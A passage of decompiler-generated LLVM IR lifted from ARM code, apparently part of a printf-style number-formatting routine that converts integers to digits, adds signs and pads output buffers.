  store i32 %.258, i32* %r3.global-to-local, align 4
  %v1_18ee0 = add i32 %v0_18ed4, 4
  %v3_18ee0 = sub i32 0, %v0_18ed4
  %v4_18ee0 = and i32 %v1_18ee0, %v3_18ee0
  %v5_18ee0 = icmp slt i32 %v4_18ee0, 0
  %v6_18ee0 = icmp slt i32 %v1_18ee0, 0
  %v7_18ee0 = icmp eq i32 %v1_18ee0, 0
  store i1 %v7_18ee0, i1* %cpsr_z.global-to-local, align 1
  %v2_18ee4 = xor i1 %v6_18ee0, %v5_18ee0
  br i1 %v2_18ee4, label %.thread21, label %bb239

.thread21:                                        ; preds = %dec_label_pc_18ed4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19218

bb239:                                            ; preds = %dec_label_pc_18ed4
  %v2_18ee8 = icmp eq i1 %v4_18ed8, false
  store i1 %v2_18ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ee8, label %dec_label_pc_19218, label %.thread24

.thread24:                                        ; preds = %bb239
  %v3_18eec = sub i32 %v1_18ed4, %v0_18ed4
  store i32 %v3_18eec, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18f08

dec_label_pc_18efc:                               ; preds = %bb236
  %v0_18efc = load i32, i32* %sb.global-to-local, align 4
  %v7_18efc = icmp eq i32 %v0_18efc, 102
  store i1 %v7_18efc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_18efc, i32* %r8.global-to-local, align 4
  br i1 %v7_18efc, label %dec_label_pc_18efc.dec_label_pc_18f08_crit_edge, label %dec_label_pc_18f18

dec_label_pc_18efc.dec_label_pc_18f08_crit_edge:  ; preds = %dec_label_pc_18efc
  %v0_18f08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f08

dec_label_pc_18f08:                               ; preds = %.thread24, %dec_label_pc_18efc.dec_label_pc_18f08_crit_edge
  %v0_18f08 = phi i32 [ %v0_18f08.pre, %dec_label_pc_18efc.dec_label_pc_18f08_crit_edge ], [ %v0_18ed4, %.thread24 ]
  %v1_18f08 = icmp slt i32 %v0_18f08, 0
  %v2_18f08 = icmp eq i32 %v0_18f08, 0
  store i1 %v2_18f08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18f08, label %bb240, label %dec_label_pc_18f18

bb240:                                            ; preds = %dec_label_pc_18f08
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_18f10 = load i32, i32* %r2.global-to-local, align 4
  %v6_18f10 = add i32 %v5_18f10, -1
  %v7_18f10 = inttoptr i32 %v6_18f10 to i8*
  store i8 48, i8* %v7_18f10, align 1
  %v8_18f10 = load i32, i32* %r2.global-to-local, align 4
  %v9_18f10 = add i32 %v8_18f10, -1
  store i32 %v9_18f10, i32* %r2.global-to-local, align 4
  %v0_18f14.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_18f48.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_18f18

dec_label_pc_18f18:                               ; preds = %bb240, %dec_label_pc_18f08, %dec_label_pc_19218, %dec_label_pc_18efc
  %v1_18f48 = phi i32 [ %v1_18ecc, %dec_label_pc_18efc ], [ %v1_18ecc, %dec_label_pc_19218 ], [ %v1_18f48.pre.pre, %bb240 ], [ %v1_18ecc, %dec_label_pc_18f08 ]
  %v1_18fc030 = phi i32 [ 0, %dec_label_pc_18efc ], [ 0, %dec_label_pc_19218 ], [ %v0_18f14.pre, %bb240 ], [ %v0_18f08, %dec_label_pc_18f08 ]
  store i32 %v1_18fc030, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_18f24 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_18f24, i32* %r3.global-to-local, align 4
  %v0_18f30 = load i32, i32* %r2.global-to-local, align 4
  %v1_18f30 = inttoptr i32 %v0_18f30 to i8*
  %v2_18f30 = load i8, i8* %v1_18f30, align 1
  %v3_18f30 = zext i8 %v2_18f30 to i32
  store i32 %v3_18f30, i32* %r3.global-to-local, align 4
  %v5_18f30 = add i32 %v0_18f30, 1
  store i32 %v5_18f30, i32* %r2.global-to-local, align 4
  %v1_18f34 = icmp slt i32 %v1_18fc030, 0
  %v2_18f34 = icmp eq i32 %v1_18fc030, 0
  store i1 %v2_18f34, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_18f30, i32* %r6.global-to-local, align 4
  store i32 %v3_18f30, i32* %stack_var_-42, align 4
  %v2_18f48 = sub i32 %v1_18f48, %v5_18f30
  store i32 %v2_18f48, i32* %ip.global-to-local, align 4
  br i1 %v1_18f34, label %.thread, label %dec_label_pc_18f54

.thread:                                          ; preds = %dec_label_pc_18f18
  %v5_18f4c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_18f4c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18fd0

dec_label_pc_18f54:                               ; preds = %dec_label_pc_18f18
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_18f58 = sub i32 %v1_18fc030, %v2_18f48
  %v4_18f58 = xor i32 %v2_18f48, %v1_18fc030
  %v5_18f58 = xor i32 %v2_18f58, %v1_18fc030
  %v6_18f58 = and i32 %v5_18f58, %v4_18f58
  %v7_18f58 = icmp slt i32 %v6_18f58, 0
  %v8_18f58 = icmp slt i32 %v2_18f58, 0
  %v9_18f58 = icmp eq i32 %v1_18fc030, %v2_18f48
  store i1 %v9_18f58, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
  %v2_18f64 = xor i1 %v8_18f58, %v7_18f58
  br i1 %v2_18f64, label %dec_label_pc_18fb0, label %dec_label_pc_18f68

dec_label_pc_18f68:                               ; preds = %dec_label_pc_18f54
  store i32 %v2_18f58, i32* %r2.global-to-local, align 4
  %v2_18f6c = icmp eq i32 %v2_18f58, 0
  store i1 %v2_18f6c, i1* %cpsr_z.global-to-local, align 1
  %v2_18f70 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_18f70, i32* %lr.global-to-local, align 4
  %tmp241 = icmp slt i32 %v2_18f58, 1
  br i1 %tmp241, label %.thread148, label %dec_label_pc_18f84

.thread148:                                       ; preds = %dec_label_pc_18f68
  %v7_18f78 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v7_18f78, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %.thread34

dec_label_pc_18f84:                               ; preds = %dec_label_pc_18f68
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1421), i32* %r3.global-to-local, align 4
  %v2_18f94 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_18f94, i32* %r7.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 176, i32* %stack_var_-144, align 4
  br label %dec_label_pc_18fd0

dec_label_pc_18fb0:                               ; preds = %dec_label_pc_18f54
  store i1 %v2_18f34, i1* %cpsr_z.global-to-local, align 1
  %v2_18fb4 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_18fb4, i32* %lr.global-to-local, align 4
  br i1 %v2_18f34, label %bb242, label %bb243

bb242:                                            ; preds = %dec_label_pc_18fb0
  %v3_18fbc = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v3_18fbc, i32* %r7.global-to-local, align 4
  br label %.thread34

bb243:                                            ; preds = %dec_label_pc_18fb0
  %v3_18fc0 = sub i32 %v2_18f48, %v1_18fc030
  store i32 %v3_18fc0, i32* %ip.global-to-local, align 4
  %v3_18fc463 = add i32 %v5_18f30, %v1_18fc030
  store i32 %v3_18fc463, i32* %r6.global-to-local, align 4
  %v3_18fc8 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v3_18fc8, i32* %r7.global-to-local, align 4
  br label %.thread34

.thread34:                                        ; preds = %.thread148, %bb242, %bb243
  %v1_19010265 = phi i32 [ %v3_18fbc, %bb242 ], [ %v3_18fc8, %bb243 ], [ %v7_18f78, %.thread148 ]
  %v0_18fe4102 = phi i32 [ %v2_18f48, %bb242 ], [ %v3_18fc0, %bb243 ], [ 0, %.thread148 ]
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18fd0

dec_label_pc_18fd0:                               ; preds = %.thread, %dec_label_pc_18f84, %.thread34
  %v1_19010 = phi i32 [ %v2_18f94, %dec_label_pc_18f84 ], [ %v1_19010265, %.thread34 ], [ %v5_18f4c, %.thread ]
  %v0_19024109 = phi i32 [ -1, %dec_label_pc_18f84 ], [ -1, %.thread34 ], [ %v1_18fc030, %.thread ]
  %v0_18fe4 = phi i32 [ 0, %dec_label_pc_18f84 ], [ %v0_18fe4102, %.thread34 ], [ %v2_18f48, %.thread ]
  %v3_18fd0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_18fd0, i32* %r2.global-to-local, align 4
  %v1_18fd4 = add i32 %v3_18fd0, 12
  %v2_18fd4 = inttoptr i32 %v1_18fd4 to i32*
  %v3_18fd4 = load i32, i32* %v2_18fd4, align 4
  %v1_18fd8 = and i32 %v3_18fd4, 16
  store i32 %v1_18fd8, i32* %r4.global-to-local, align 4
  %v2_18fd8 = icmp eq i32 %v1_18fd8, 0
  %tmp270 = zext i1 %v2_18fd8 to i32
  %.259 = xor i32 %tmp270, 1
  store i32 %.259, i32* %r3.global-to-local, align 4
  %v2_18fe4 = icmp eq i32 %v0_18fe4, 0
  store i1 %v2_18fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fe4, label %bb246, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_18fd0
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_19000

bb246:                                            ; preds = %dec_label_pc_18fd0
  store i1 %v2_18fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fd8, label %dec_label_pc_18ff4, label %dec_label_pc_19000

dec_label_pc_18ff4:                               ; preds = %bb246
  %v0_18ff4 = load i32, i32* %sb.global-to-local, align 4
  %v7_18ff4 = icmp eq i32 %v0_18ff4, 103
  store i1 %v7_18ff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ff4, label %dec_label_pc_19024, label %bb247

bb247:                                            ; preds = %dec_label_pc_18ff4
  %v1_18ff8 = load i32, i32* %fp.global-to-local, align 4
  %v3_18ff8 = icmp eq i32 %v1_18ff8, 0
  store i1 %v3_18ff8, i1* %cpsr_z.global-to-local, align 1
  %tmp248 = icmp slt i32 %v1_18ff8, 1
  br i1 %tmp248, label %dec_label_pc_19024, label %dec_label_pc_19000

dec_label_pc_19000:                               ; preds = %.thread37, %bb246, %bb247
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1424), i32* %r3.global-to-local, align 4
  %v2_19010 = inttoptr i32 %v1_19010 to i32*
  store i32 112, i32* %v2_19010, align 4
  %v0_19014 = load i32, i32* %r3.global-to-local, align 4
  %v1_19014 = add i32 %v0_19014, 16
  store i32 %v1_19014, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_1901c = load i32, i32* %r7.global-to-local, align 4
  %v1_1901c = add i32 %v0_1901c, 4
  %v2_1901c = inttoptr i32 %v1_1901c to i32*
  store i32 1, i32* %v2_1901c, align 4
  %v4_1901c = add i32 %v0_1901c, 8
  %v5_1901c = inttoptr i32 %v4_1901c to i32*
  %v6_1901c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_1901c, i32* %v5_1901c, align 4
  %v0_19020 = load i32, i32* %r7.global-to-local, align 4
  %v1_19020 = add i32 %v0_19020, 12
  store i32 %v1_19020, i32* %r7.global-to-local, align 4
  %v0_19024.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19024

dec_label_pc_19024:                               ; preds = %dec_label_pc_18ff4, %bb247, %dec_label_pc_19000
  %v1_19044 = phi i32 [ %v1_19010, %bb247 ], [ %v1_19020, %dec_label_pc_19000 ], [ %v1_19010, %dec_label_pc_18ff4 ]
  %v0_19024 = phi i32 [ %v0_19024109, %bb247 ], [ %v0_19024.pre, %dec_label_pc_19000 ], [ %v0_19024109, %dec_label_pc_18ff4 ]
  %v1_19024 = add i32 %v0_19024, 1
  store i32 %v1_19024, i32* %lr.global-to-local, align 4
  %v6_19024 = icmp slt i32 %v1_19024, 0
  %v7_19024 = icmp eq i32 %v1_19024, 0
  store i1 %v7_19024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_19024, label %dec_label_pc_1902c, label %dec_label_pc_19050

dec_label_pc_1902c:                               ; preds = %dec_label_pc_19024
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1421), i32* %r3.global-to-local, align 4
  %v1_1903c = sub i32 -1, %v0_19024
  store i32 %v1_1903c, i32* %r1.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_19044 = inttoptr i32 %v1_19044 to i32*
  store i32 176, i32* %v2_19044, align 4
  %v0_19048 = load i32, i32* %r7.global-to-local, align 4
  %v1_19048 = add i32 %v0_19048, 4
  %v2_19048 = inttoptr i32 %v1_19048 to i32*
  %v3_19048 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_19048, i32* %v2_19048, align 4
  %v4_19048 = add i32 %v0_19048, 8
  %v5_19048 = inttoptr i32 %v4_19048 to i32*
  %v6_19048 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_19048, i32* %v5_19048, align 4
  %v0_1904c = load i32, i32* %r7.global-to-local, align 4
  %v1_1904c = add i32 %v0_1904c, 12
  store i32 %v1_1904c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19050

dec_label_pc_19050:                               ; preds = %dec_label_pc_19024, %dec_label_pc_1902c
  %v2_19058 = phi i32 [ %v1_19044, %dec_label_pc_19024 ], [ %v1_1904c, %dec_label_pc_1902c ]
  %v0_19050 = load i32, i32* %ip.global-to-local, align 4
  %v2_19050 = icmp eq i32 %v0_19050, 0
  store i1 %v2_19050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19050, label %.thread46, label %bb249

bb249:                                            ; preds = %dec_label_pc_19050
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_19058 = inttoptr i32 %v2_19058 to i32*
  store i32 112, i32* %v3_19058, align 4
  %v1_1905c = load i32, i32* %r6.global-to-local, align 4
  %v2_1905c = load i32, i32* %r7.global-to-local, align 4
  %v3_1905c = add i32 %v2_1905c, 8
  %v4_1905c = inttoptr i32 %v3_1905c to i32*
  store i32 %v1_1905c, i32* %v4_1905c, align 4
  %v1_19060 = load i32, i32* %ip.global-to-local, align 4
  %v2_19060 = load i32, i32* %r7.global-to-local, align 4
  %v3_19060 = add i32 %v2_19060, 4
  %v4_19060 = inttoptr i32 %v3_19060 to i32*
  store i32 %v1_19060, i32* %v4_19060, align 4
  %v1_19064 = load i32, i32* %r7.global-to-local, align 4
  %v2_19064 = add i32 %v1_19064, 12
  store i32 %v2_19064, i32* %r7.global-to-local, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_19050, %bb249
  %v1_1909c = phi i32 [ %v2_19058, %dec_label_pc_19050 ], [ %v2_19064, %bb249 ]
  %v0_19068 = load i32, i32* %sb.global-to-local, align 4
  %v7_19068 = icmp eq i32 %v0_19068, 103
  store i1 %v7_19068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19068, label %dec_label_pc_19070, label %dec_label_pc_19078

dec_label_pc_19070:                               ; preds = %.thread46
  %v0_19070 = load i32, i32* %r4.global-to-local, align 4
  %v2_19070 = icmp eq i32 %v0_19070, 0
  store i1 %v2_19070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19070, label %dec_label_pc_190a8, label %dec_label_pc_19078

dec_label_pc_19078:                               ; preds = %.thread46, %dec_label_pc_19070
  %v0_19078 = load i32, i32* %lr.global-to-local, align 4
  %v1_19078 = load i32, i32* %ip.global-to-local, align 4
  %v2_19078 = sub i32 %v1_19078, %v0_19078
  store i32 %v2_19078, i32* %r1.global-to-local, align 4
  %v1_1907c = load i32, i32* %fp.global-to-local, align 4
  %v2_1907c = sub i32 %v2_19078, %v1_1907c
  %v4_1907c = xor i32 %v1_1907c, %v2_19078
  %v5_1907c = xor i32 %v2_1907c, %v2_19078
  %v6_1907c = and i32 %v5_1907c, %v4_1907c
  %v7_1907c = icmp slt i32 %v6_1907c, 0
  %v8_1907c = icmp slt i32 %v2_1907c, 0
  %v9_1907c = icmp eq i32 %v2_19078, %v1_1907c
  store i1 %v9_1907c, i1* %cpsr_z.global-to-local, align 1
  %v2_19080 = xor i1 %v8_1907c, %v7_1907c
  br i1 %v2_19080, label %dec_label_pc_19084, label %dec_label_pc_190a8

dec_label_pc_19084:                               ; preds = %dec_label_pc_19078
  %v2_19090 = sub i32 %v1_1907c, %v2_19078
  store i32 %v2_19090, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1421), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v2_1909c = inttoptr i32 %v1_1909c to i32*
  store i32 176, i32* %v2_1909c, align 4
  %v0_190a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_190a0 = add i32 %v0_190a0, 4
  %v2_190a0 = inttoptr i32 %v1_190a0 to i32*
  %v3_190a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v3_190a0, i32* %v2_190a0, align 4
  %v4_190a0 = add i32 %v0_190a0, 8
  %v5_190a0 = inttoptr i32 %v4_190a0 to i32*
  %v6_190a0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v6_190a0, i32* %v5_190a0, align 4
  %v0_190a4 = load i32, i32* %r7.global-to-local, align 4
  %v1_190a4 = add i32 %v0_190a4, 12
  store i32 %v1_190a4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_190a8

dec_label_pc_190a8:                               ; preds = %dec_label_pc_19078, %dec_label_pc_19070, %dec_label_pc_19084
  %v1_1913c.pre.pre = phi i32 [ %v1_1909c, %dec_label_pc_19078 ], [ %v1_1909c, %dec_label_pc_19070 ], [ %v1_190a4, %dec_label_pc_19084 ]
  %v0_190a8 = load i32, i32* %r8.global-to-local, align 4
  %v7_190a8 = icmp eq i32 %v0_190a8, 102
  store i1 %v7_190a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190a8, label %dec_label_pc_19130, label %dec_label_pc_190b0

dec_label_pc_190b0:                               ; preds = %dec_label_pc_190a8
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_190b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_190b4 = icmp slt i32 %v0_190b4, 0
  %v2_190b4 = icmp eq i32 %v0_190b4, 0
  store i1 %v2_190b4, i1* %cpsr_z.global-to-local, align 1
  %v4_190b8 = select i1 %tmp275, i32 %v4_18dd4126130, i32 101
  store i32 %v4_190b8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %stack_var_-47, align 4
  %v4_190c8 = sub i32 0, %v0_190b4
  %storemerge158 = select i1 %v1_190b4, i32 %v4_190c8, i32 %v0_190b4
  %tmp271 = ashr i32 %v0_190b4, 31
  %tmp272 = and i32 %tmp271, 2
  %tmp273 = add nuw nsw i32 %tmp272, 43
  store i32 %storemerge158, i32* %r5.global-to-local, align 4
  store i32 %tmp273, i32* %sl.global-to-local, align 4
  %v2_190d0 = ptrtoint i32* %stack_var_-47 to i32
  store i32 %v2_190d0, i32* %r6.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_190d8

dec_label_pc_190d8:                               ; preds = %dec_label_pc_19108, %dec_label_pc_190d8, %dec_label_pc_190b0
  %v2_190f0 = phi i32 [ %v2_190d0, %dec_label_pc_190b0 ], [ %v6_190f0, %dec_label_pc_190d8 ], [ %v6_190f0, %dec_label_pc_19108 ]
  %v0_190e8 = phi i32 [ %storemerge158, %dec_label_pc_190b0 ], [ %v2_190f4, %dec_label_pc_190d8 ], [ %v2_190f4, %dec_label_pc_19108 ]
  %v3_190e0 = urem i32 %v0_190e8, 10
  %v1_190e4 = or i32 %v3_190e0, 48
  store i32 %v1_190e4, i32* %r3.global-to-local, align 4
  store i32 %v0_190e8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_190f0 = trunc i32 %v1_190e4 to i8
  %v3_190f0 = add i32 %v2_190f0, -1
  %v4_190f0 = inttoptr i32 %v3_190f0 to i8*
  store i8 %v1_190f0, i8* %v4_190f0, align 1
  %v5_190f0 = load i32, i32* %r6.global-to-local, align 4
  %v6_190f0 = add i32 %v5_190f0, -1
  store i32 %v6_190f0, i32* %r6.global-to-local, align 4
  %v0_190f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_190f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_190f4 = sdiv i32 %v0_190f4, %v1_190f4
  store i32 %v2_190f4, i32* %r0.global-to-local, align 4
  %v0_190f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_190f8 = add i32 %v0_190f8, 1
  store i32 %v1_190f8, i32* %r8.global-to-local, align 4
  %v7_190fc = icmp eq i32 %v1_190f8, 3
  store i1 %v7_190fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_190f4, i32* %r5.global-to-local, align 4
  br i1 %v7_190fc, label %dec_label_pc_190d8, label %dec_label_pc_19108

dec_label_pc_19108:                               ; preds = %dec_label_pc_190d8
  %v2_19108 = icmp eq i32 %v2_190f4, 0
  store i1 %v2_19108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19108, label %dec_label_pc_19110, label %dec_label_pc_190d8

dec_label_pc_19110:                               ; preds = %dec_label_pc_19108
  %v1_19110 = add i32 %v5_190f0, -2
  store i32 %v1_19110, i32* %r3.global-to-local, align 4
  %v0_19114 = load i32, i32* %sl.global-to-local, align 4
  %v1_19114 = trunc i32 %v0_19114 to i8
  %v4_19114 = inttoptr i32 %v1_19110 to i8*
  store i8 %v1_19114, i8* %v4_19114, align 1
  %v0_19118 = load i32, i32* %r3.global-to-local, align 4
  %v1_19118 = add i32 %v0_19118, -1
  store i32 %v1_19118, i32* %r2.global-to-local, align 4
  %v0_1911c = load i32, i32* %r4.global-to-local, align 4
  %v1_1911c = trunc i32 %v0_1911c to i8
  %v4_1911c = inttoptr i32 %v1_19118 to i8*
  store i8 %v1_1911c, i8* %v4_1911c, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_19124 = load i32, i32* %r7.global-to-local, align 4
  %v1_19124 = inttoptr i32 %v0_19124 to i32*
  store i32 112, i32* %v1_19124, align 4
  %v3_19124 = add i32 %v0_19124, 4
  %v4_19124 = inttoptr i32 %v3_19124 to i32*
  %v5_19124 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v5_19124, i32* %v4_19124, align 4
  %v0_19128 = load i32, i32* %r2.global-to-local, align 4
  %v1_19128 = load i32, i32* %r7.global-to-local, align 4
  %v2_19128 = add i32 %v1_19128, 8
  %v3_19128 = inttoptr i32 %v2_19128 to i32*
  store i32 %v0_19128, i32* %v3_19128, align 4
  %v0_1912c = load i32, i32* %r7.global-to-local, align 4
  %v1_1912c = add i32 %v0_1912c, 12
  store i32 %v1_1912c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19130

dec_label_pc_19130:                               ; preds = %dec_label_pc_190a8, %.thread124, %dec_label_pc_19110
  %v1_1913c.pre = phi i32 [ %v2_18c08, %.thread124 ], [ %v1_1912c, %dec_label_pc_19110 ], [ %v1_1913c.pre.pre, %dec_label_pc_190a8 ]
  %v2_19130 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_19130, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19134

dec_label_pc_19134:                               ; preds = %dec_label_pc_19134, %dec_label_pc_19130
  %v0_19134 = phi i32 [ %v2_19130, %dec_label_pc_19130 ], [ %v4_19134, %dec_label_pc_19134 ]
  %stack_var_-188.0 = phi i32 [ %v3_18aa4, %dec_label_pc_19130 ], [ %v2_19140, %dec_label_pc_19134 ]
  %v1_19134 = inttoptr i32 %v0_19134 to i32*
  %v2_19134 = load i32, i32* %v1_19134, align 4
  store i32 %v2_19134, i32* %r3.global-to-local, align 4
  %v4_19134 = add i32 %v0_19134, 12
  store i32 %v4_19134, i32* %r2.global-to-local, align 4
  %v3_1913c = icmp ult i32 %v4_19134, %v1_1913c.pre
  %v2_19140 = sub i32 %stack_var_-188.0, %v2_19134
  store i32 %v2_19140, i32* %ip.global-to-local, align 4
  br i1 %v3_1913c, label %dec_label_pc_19134, label %dec_label_pc_1914c

dec_label_pc_1914c:                               ; preds = %dec_label_pc_19134
  %v3_1914c = load i8, i8* %stack_var_-46, align 1
  %v4_1914c = sext i8 %v3_1914c to i32
  store i32 %v4_1914c, i32* %r3.global-to-local, align 4
  store i32 %v4_1914c, i32* %r2.global-to-local, align 4
  %v2_19150 = icmp eq i8 %v3_1914c, 0
  store i1 %v2_19150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19150, label %bb254, label %bb253

bb253:                                            ; preds = %dec_label_pc_1914c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb254

bb254:                                            ; preds = %dec_label_pc_1914c, %bb253
  %v1_191b0 = phi i32 [ %v4_1914c, %dec_label_pc_1914c ], [ 1, %bb253 ]
  %v2_19158 = sub i32 %v2_19140, %v1_191b0
  store i32 %v2_19158, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_19160 = ptrtoint i8* %stack_var_-46 to i32
  store i32 %v2_19160, i32* %r3.global-to-local, align 4
  %v2_19164 = icmp eq i32 %v2_19158, 0
  store i1 %v2_19164, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-180, align 4
  %tmp255 = icmp slt i32 %v2_19158, 1
  br i1 %tmp255, label %dec_label_pc_191cc, label %dec_label_pc_19178

dec_label_pc_19178:                               ; preds = %bb254
  %v3_19178 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_19178, i32* %lr.global-to-local, align 4
  %v1_1917c = add i32 %v3_19178, 12
  %v2_1917c = inttoptr i32 %v1_1917c to i32*
  %v3_1917c = load i32, i32* %v2_1917c, align 4
  store i32 %v3_1917c, i32* %r3.global-to-local, align 4
  %v1_19180 = and i32 %v3_1917c, 8
  %v2_19180 = icmp eq i32 %v1_19180, 0
  store i1 %v2_19180, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19180, label %dec_label_pc_191a4, label %dec_label_pc_19188

dec_label_pc_19188:                               ; preds = %dec_label_pc_19178
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -1421), i32* %r3.global-to-local, align 4
  %v1_19198 = add i32 %v1_1913c.pre, 12
  store i32 %v1_19198, i32* %r6.global-to-local, align 4
  %v1_1919c = inttoptr i32 %v1_1913c.pre to i32*
  store i32 160, i32* %v1_1919c, align 4
  %v3_1919c = add i32 %v1_1913c.pre, 4
  %v4_1919c = inttoptr i32 %v3_1919c to i32*
  %v5_1919c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1919c, i32* %v4_1919c, align 4
  %v6_1919c = add i32 %v1_1913c.pre, 8
  %v7_1919c = inttoptr i32 %v6_1919c to i32*
  %v8_1919c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1919c, i32* %v7_1919c, align 4
  br label %dec_label_pc_191d0

dec_label_pc_191a4:                               ; preds = %dec_label_pc_19178
  store i32 %v3_19178, i32* %ip.global-to-local, align 4
  %v1_191a8 = add i32 %v3_19178, 16
  %v2_191a8 = inttoptr i32 %v1_191a8 to i32*
  %v3_191a8 = load i32, i32* %v2_191a8, align 4
  store i32 %v3_191a8, i32* %r3.global-to-local, align 4
  %v7_191ac = icmp eq i32 %v3_191a8, 48
  store i1 %v7_191ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_191ac, label %.thread54.thread70, label %bb256

bb256:                                            ; preds = %dec_label_pc_191a4
  store i32 %v2_19140, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_191cc

.thread54.thread70:                               ; preds = %dec_label_pc_191a4
  %v4_191b8 = load i32, i32* %stack_var_-164, align 4
  store i32 %v1_1913c.pre, i32* %r6.global-to-local, align 4
  %v3_191c0 = add i32 %v4_191b8, %v2_19158
  store i32 %v3_191c0, i32* %r3.global-to-local, align 4
  store i32 %v3_191c0, i32* %stack_var_-164, align 4
  br label %dec_label_pc_191d0

dec_label_pc_191cc:                               ; preds = %bb256, %bb254
  store i32 %v1_1913c.pre, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_191d0

dec_label_pc_191d0:                               ; preds = %.thread54.thread70, %dec_label_pc_19188, %dec_label_pc_191cc
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_191d4 = ptrtoint i32* %stack_var_-180 to i32
  store i32 %v2_191d4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_191d8

dec_label_pc_191d8:                               ; preds = %dec_label_pc_19200, %dec_label_pc_191d0
  %v0_191d8 = phi i32 [ %v1_191f4, %dec_label_pc_19200 ], [ %v2_191d4, %dec_label_pc_191d0 ]
  %v1_191d8 = inttoptr i32 %v0_191d8 to i32*
  %v2_191d8 = load i32, i32* %v1_191d8, align 4
  store i32 %v2_191d8, i32* %r1.global-to-local, align 4
  %v3_191d8 = add i32 %v0_191d8, 4
